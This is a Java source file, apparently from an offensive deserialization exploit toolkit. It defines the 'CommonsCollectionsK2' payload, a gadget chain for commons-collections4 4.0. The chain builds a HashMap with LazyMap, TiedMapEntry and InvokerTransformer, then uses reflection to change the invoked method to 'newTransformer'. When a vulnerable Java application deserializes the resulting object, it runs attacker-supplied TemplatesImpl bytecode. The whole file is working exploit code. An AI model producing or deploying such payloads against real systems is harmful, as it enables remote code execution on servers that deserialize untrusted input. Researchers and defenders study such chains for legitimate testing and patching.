package vulgui.deser.payloads;

import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import vulgui.deser.payloads.annotation.Authors;
import vulgui.deser.payloads.annotation.Dependencies;
import vulgui.deser.util.Gadgets;
import vulgui.deser.util.Reflections;

import java.util.HashMap;
import java.util.Map;

/*
Gadget chain:
same as K1, but use commons-collections4.0
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections4:4.0"})
@Authors({Authors.KORLR})
public class CommonsCollectionsK2 implements ObjectPayload<Map> {

    @Override
    public Map getObject(Object tpl) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
}
